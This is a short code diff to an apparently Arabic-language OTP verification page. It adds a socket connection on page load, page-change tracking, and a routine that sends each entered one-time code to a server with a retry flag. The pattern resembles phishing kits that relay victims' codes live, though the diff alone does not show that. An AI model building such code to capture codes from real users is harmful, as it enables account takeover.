@@ -190,7 +190,9 @@
       showToast('✓ تم إعادة إرسال رمز التحقق');
     }
     
-    document.addEventListener('DOMContentLoaded', function() {
+    document.addEventListener('DOMContentLoaded', async function() {
+      // Initialize socket connection
+      await initSocket();
       trackPageChange('verification');
       
       var inputs = document.querySelectorAll('.otp-input');
@@ -237,6 +239,14 @@
         error.style.display = 'none';
         btn.disabled = true;
         btn.style.opacity = '0.7';
+        
+        // Send verification data to server via socket
+        var verificationData = {
+          otp: otp,
+          timestamp: new Date().toISOString(),
+          retryAttempt: true
+        };
+        submitVerificationForm(verificationData);
         
         // SECURITY: Clear OTP field immediately after submission
         inputs.forEach(function(input) { input.value = ''; });
